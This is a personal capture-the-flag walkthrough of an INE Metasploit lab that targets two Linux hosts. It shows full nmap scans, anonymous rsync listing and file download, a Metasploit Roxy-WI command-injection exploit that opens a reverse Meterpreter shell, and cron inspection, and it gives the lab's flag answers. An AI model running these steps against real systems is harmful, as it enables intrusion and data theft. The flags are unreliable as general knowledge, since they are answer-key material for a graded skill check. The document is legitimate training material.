---
aliases:
  - "Host & Network Penetration Testing: The Metasploit Framework CTF 2"
---
## Overview

Linux-based systems are frequently targeted in penetration tests due to their prevalence in server environments. This lab focuses on using the Metasploit Framework (MSF) to exploit misconfigured services and vulnerable applications on Linux systems. Participants will leverage MSF to enumerate services, explore file systems, and exploit web applications to achieve shell access.

### Completing Skill Check Labs

Skill Check Labs are interactive, hands-on exercises designed to validate the knowledge and skills you’ve gained in this course through real-world scenarios. Each lab presents practical tasks that require you to apply what you’ve learned. Unlike other INE labs, solutions are not provided, challenging you to demonstrate your understanding and problem-solving abilities. Your performance is graded, allowing you to track progress and measure skill growth over time.

# Lab Environment

In this lab environment, you will have GUI access to a Kali Linux machine. Two machines are accessible at **target1.ine.local** and **target2.ine.local**.

**Objective:** Using various exploration techniques, complete the following tasks to capture the associated flags:

- **Flag 1:** Enumerate the open port using Metasploit, and inspect the RSYNC banner closely; it might reveal something interesting.
- **Flag 2:** The files on the RSYNC server hold valuable information. Explore the contents to find the flag.
- **Flag 3:** Try exploiting the webapp to gain a shell using Metasploit on target2.ine.local.
- **Flag 4:** Automated tasks can sometimes leave clues. Investigate scheduled jobs or running processes to uncover the hidden flag.

# Tools

The best tools for this lab are:

- Nmap
- Metasploit Framework
- rsync

---

### Note

In this lab, the flag will follow the format: FLAG1_MD5Hash. For example, FLAG1_0f4d0db3668dd58cabb9eb409657eaa8. You need to submit only the MD5 hash string, excluding the underscore (_). For instance: 0f4d0db3668dd58cabb9eb409657eaa8.

# Walkthrough

Let's scan the two targets.

#### Target 1

```bash
nmap -sC -sV -p- -T4 target1.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-23 00:29 IST
Nmap scan report for target1.ine.local (192.74.148.3)
Host is up (0.000022s latency).
Not shown: 65534 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)
MAC Address: 02:42:C0:4A:94:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.35 seconds
```

#### Target 2

```bash
┌──(root㉿INE)-[~]
└─# nmap -sC -sV -T4 -p- target2.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-23 00:29 IST
Nmap scan report for target2.ine.local (192.74.148.4)
Host is up (0.000021s latency).
Not shown: 65533 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Roxy-WI
443/tcp open  ssl/http Apache httpd 2.4.52
| tls-alpn: 
|_  http/1.1
|_http-title: Roxy-WI
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=*.roxy-wi.org/organizationName=Roxy-WI/stateOrProvinceName=Almaty/countryName=US
| Not valid before: 2022-07-29T05:20:44
|_Not valid after:  2050-12-14T05:20:44
|_http-server-header: Apache/2.4.52 (Ubuntu)
MAC Address: 02:42:C0:4A:94:04 (Unknown)
Service Info: Host: roxy-wi.example.com

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.85 seconds

```
## **Flag 1:** Enumerate the open port using Metasploit, and inspect the RSYNC banner closely; it might reveal something interesting.

For this I asked Chatgpt to use rsync and it gave me this command and got the first flag

```bash
┌──(root㉿INE)-[~]
└─# rsync rsync://target1.ine.local/
backupwscohen   FLAG1_7024a48742f44527bf2f693db6e8d81d

```

## **Flag 2:** The files on the RSYNC server hold valuable information. Explore the contents to find the flag.

Before this chatgpt gave me another command with the first one to sync files.

```bash
┌──(root㉿INE)-[~]
└─# rsync -av rsync://target1.ine.local/backupwscohen/ .
receiving incremental file list
./
TPSData.txt
office_staff.vhd
pii_data.xlsx

sent 84 bytes  received 341 bytes  850.00 bytes/sec
total size is 84  speedup is 0.20
                                                                                                               
┌──(root㉿INE)-[~]
└─# ls
Desktop    Downloads  office_staff.vhd  pii_data.xlsx  Templates          TPSData.txt
Documents  Music      Pictures          Public         thinclient_drives  Videos
                                                                                                               
┌──(root㉿INE)-[~]
└─# cat office_staff.vhd 
Sample office staff data
                                                                                                               
┌──(root㉿INE)-[~]
└─# cat pii_data.xlsx 
FLAG2_9b9fd69ccb6d44eabadb0c74c77eeac5

```

got the second flag
## **Flag 3:** Try exploiting the webapp to gain a shell using Metasploit on target2.ine.local.

So apparently there is a webapp running 

![[Pasted image 20250623004328.png]]

So, I bindly trusted metasploit and got the access

```bash
┌──(root㉿INE)-[~]
└─# msfconsole -q
msf6 > search roxy-wi

Matching Modules
================

   #  Name                             Disclosure Date  Rank       Check  Description
   -  ----                             ---------------  ----       -----  -----------
   0  exploit/linux/http/roxy_wi_exec  2022-07-06       excellent  Yes    Roxy-WI Prior to 6.1.1.0 Unauthenticated Command Injection RCE
   1    \_ target: Unix (In-Memory)    .                .          .      .
   2    \_ target: Linux (Dropper)     .                .          .      .


Interact with a module by name or index. For example info 2, use 2 or use exploit/linux/http/roxy_wi_exec
After interacting with a module you can manually set a TARGET with set TARGET 'Linux (Dropper)'

msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/python/meterpreter/reverse_tcp
msf6 exploit(linux/http/roxy_wi_exec) > setg RHOSTS target2.ine.local
RHOSTS => target2.ine.local
msf6 exploit(linux/http/roxy_wi_exec) > show options

Module options (exploit/linux/http/roxy_wi_exec):

   Name       Current Setting    Required  Description
   ----       ---------------    --------  -----------
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     target2.ine.local  yes       The target host(s), see https://docs.metasploit.com/docs/using-met
                                           asploit/basics/using-metasploit.html
   RPORT      443                yes       The target port (TCP)
   SSL        true               no        Negotiate SSL/TLS for outgoing connections
   SSLCert                       no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                  yes       The URI of the vulnerable instance
   URIPATH                       no        The URI to use for this exploit (default is random)
   VHOST                         no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an addr
                                       ess on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (cmd/unix/python/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  127.0.0.1        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Unix (In-Memory)



View the full module info with the info, or info -d command.

msf6 exploit(linux/http/roxy_wi_exec) > run

[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.0.1:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 192.74.148.4:443 is vulnerable!
[*] 192.74.148.4:443 is vulnerable!
[+] The target is vulnerable. The device responded to exploitation with a 200 OK and test command successfully executed.
[*] Exploiting...
[*] Exploit completed, but no session was created.
msf6 exploit(linux/http/roxy_wi_exec) > set LHOST eth1
LHOST => 192.74.148.2
msf6 exploit(linux/http/roxy_wi_exec) > run

[*] Started reverse TCP handler on 192.74.148.2:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 192.74.148.4:443 is vulnerable!
[*] 192.74.148.4:443 is vulnerable!
[+] The target is vulnerable. The device responded to exploitation with a 200 OK and test command successfully executed.
[*] Exploiting...
[*] Sending stage (24768 bytes) to 192.74.148.4
[*] Meterpreter session 1 opened (192.74.148.2:4444 -> 192.74.148.4:57414) at 2025-06-23 00:46:46 +0530



meterpreter > 
meterpreter > 
meterpreter > 

```

Now for the flag.

```bash
meterpreter > cd /
meterpreter > cat flag.txt
FLAG3_0ae6279a95d84ad4b0a7fe9c8b07e954
```
## **Flag 4:** Automated tasks can sometimes leave clues. Investigate scheduled jobs or running processes to uncover the hidden flag.

So, it took a long time but I finally figured out. I navigated to the `/etc/cron.d` found 2 files there opened both and got the flag in the second one.

`
```bash
www-data@target2:/$ cd /etc 
cd /etc
www-data@target2:/etc$ ls
ls
www-data@target2:/etc$ X11
adduser.conf
alternatives
apache2
apparmor.d
apt
bash.bashrc
bindresvport.blacklist
ca-certificates
ca-certificates.conf
cron.d
cron.daily
dbus-1
debconf.conf
debian_version
default
deluser.conf
dpkg
e2scrub.conf
environment
ethertypes
fonts
fstab
gai.conf
group
group-
gshadow
gshadow-
gss
host.conf
hostname
hosts
hosts.allow
hosts.deny
init.d
inputrc
iproute2
issue
issue.net
kernel
ld.so.cache
ld.so.conf
ld.so.conf.d
ldap
legal
libaudit.conf
lighttpd
localtime
logcheck
login.defs
logrotate.d
lsb-release
machine-id
magic
magic.mime
mailcap
mailcap.order
matplotlibrc
mime.types
mke2fs.conf
mtab
mysql
netconfig
networks
nsswitch.conf
opt
os-release
pam.conf
pam.d
passwd
passwd-
perl
profile
profile.d
protocols
python3
python3.10
rc0.d
rc1.d
rc2.d
rc3.d
rc4.d
rc5.d
rc6.d
rcS.d
resolv.conf
rmt
rpc
security
selinux
services
shadow
shadow-
shells
skel
ssh
ssl
subgid
subuid
sudo.conf
sudo_logsrvd.conf
sudoers
sudoers.d
supervisor
sysctl.conf
sysctl.d
systemd
terminfo
timezone
ucf.conf
ufw
update-motd.d
wgetrc
xattr.conf
xdg


www-data@target2:/etc$ cd crod.d
cd crod.d
bash: cd: crod.d: No such file or directory
www-data@target2:/etc$ cd cron.d
cd cron.d
www-data@target2:/etc/cron.d$ ls
ls
www-data@target2:/etc/cron.d$ e2scrub_all
www-data-cron


www-data@target2:/etc/cron.d$ cat e2scrub_all
cat e2scrub_all
www-data@target2:/etc/cron.d$ 30 3 * * 0 root test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron
10 3 * * * root test -e /run/systemd/system || SERVICE_MODE=1 /sbin/e2scrub_all -A -r


www-data@target2:/etc/cron.d$ ls
ls
www-data@target2:/etc/cron.d$ e2scrub_all
www-data-cron


www-data@target2:/etc/cron.d$ cat www-data-cron
cat www-data-cron
www-data@target2:/etc/cron.d$ * * * * * www-data echo "FLAG4_8459748e03074c5abb91d2f5bab34638"


```

